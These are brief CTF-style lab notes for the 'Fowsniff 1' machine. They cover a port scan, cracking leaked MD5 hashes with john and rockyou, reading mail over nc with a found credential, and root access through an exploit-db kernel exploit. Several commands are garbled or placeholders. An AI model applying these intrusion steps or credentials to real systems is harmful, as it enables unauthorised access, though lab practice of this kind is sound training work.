# Fowsniff 1
```
export ip = "10.10.190.31"
```

## Port Scan
```
22 ssh
80 http
110 pop3
143 imap 
```

## Web Recon
```
1. http://10.10.254.176/

2. twitter : fowsniff 

3. https://pastebin.com/NrAqVeeX

4. Decrypt Credential Get
```

## Credential Crack
```
1. john {{decrypt_credential.txt}} --format=raw-md5 --wordlist= rockyou
```

## IMAP Enumeration
```
1. Accessable Credential : seina:scoobydoo2
2. Access Command : nc export_ip port

-----------IMAP Eunmerate-----------------
1. user seina
2. user scoobydoo2
3. RETR 1 S1ck3nBluff+secureshell --> SSH password
4. RETR 2 baksteen --> ID
```

## Priviliege Esclate
```
1. What's Point?
--> Kernel version

2. exploit-db
--> https://www.exploit-db.com/exploits/44298 

3. Get root
```